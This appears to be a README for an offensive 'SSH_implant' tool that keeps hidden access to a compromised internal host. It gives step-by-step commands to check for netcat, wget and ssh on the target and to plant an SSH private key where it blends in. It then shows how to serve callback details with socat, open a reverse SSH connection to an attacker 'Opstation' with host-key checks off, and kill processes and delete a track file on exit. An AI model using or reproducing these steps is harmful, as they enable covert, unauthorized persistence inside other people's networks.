# SSH_implant
<h3>Purpose</h3>
Post Exploitation action after accessing an internal target in a network. Enables future access to an internal targets ssh server (Internal target must be able to access the internet)
<h5>Step One</h5>
Setup chroot and user on Opstation, use chroot_setup.sh
<h5>Step Two</h5>
<h3>On Target</h3> <br />
#Verify target can reach the CHK_IP <br />
ping -c 1 [CHK_IP] <br />
#Verify target has nc with the following options: -z, -n, -w <br />
which nc netcat wget perl <br />
	//is the wget option viable? <br />
#Verify target has SSH <br />
which ssh <br />
#netstat or ss? <br />
	//adjust "implant_script.sh" as needed <br /><br />
<h3>On Opstation</h3> <br />
#Create ssh key <br />
ssh-keygen <br />
	//Remove [user]@[hostname] from pubkey and add key to chroot users .ssh/authorized_keys <br />
		cat [pubkey] | cut -d " " -f 1,2 >> [chroot_user_home]/.ssh/authorized_keys <br />
#Put ssh privkey on target, try to make location blend in <br />
	likely will use scp or ssh-cat to get it up to target. Depending on access method <br />
#Configure "implant_script.sh" variables. See "Implant Variables Defined" section <br />
<h3>To Connect</h3>
//CHK_PORT must be open on a CHK_IP

#On a CHK_IP from Implant script <br />
//Create/edit info.sh  *info.sh either needs to be on the CHK_IP or a tunnel needs to be setup forwarding to the device info.sh is on* <br />
cat \<\<EOF\>info.sh <br />
echo -n "[CB_PORT]:[CB_IP]:[REMLIS]" <br />
EOF <br />
chmod +x info.sh <br />
socat -d -d TCP-LISTEN:[CHK_PORT],fork,reuseaddr system:/path/to/info.sh <br /> <br />

//Initial Connection <br />
ssh -M -S /tmp/[target] -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p [REMLIS] [user]@127.0.0.1 <br /><br />

//Getting an additional terminal <br />
ssh -S /tmp/[target] [user] <br /> <br />

//Tunnel manipulation using an existing socket <br />
ssh -S /tmp/[target] [user] -O [forward|cancel|exit} -[L|R] [tunnel_ip]:[tunnel_port]:[forward_ip]:[forward_port] <br /><br />

****SUPER IMPORTANT STEP**** <br />
//After connecting you will have no more than 2min from the establishment of the Remote listener you connected to to do the following <br />
ps -efH <br />
kill -9 [PID_of_Sleep_Cmd] <br /> <br />

//Note <br />
The sleep time can be adjusted to more than 2min when initially implanting or afterward by editing the script on target but is not recommended <br />

<h3>Exiting</h3>
//Must exit with the following <br />
rm -f [TRACK_FILE] && kill -9 [PID_OF_SSH_CONNECTION] <br />

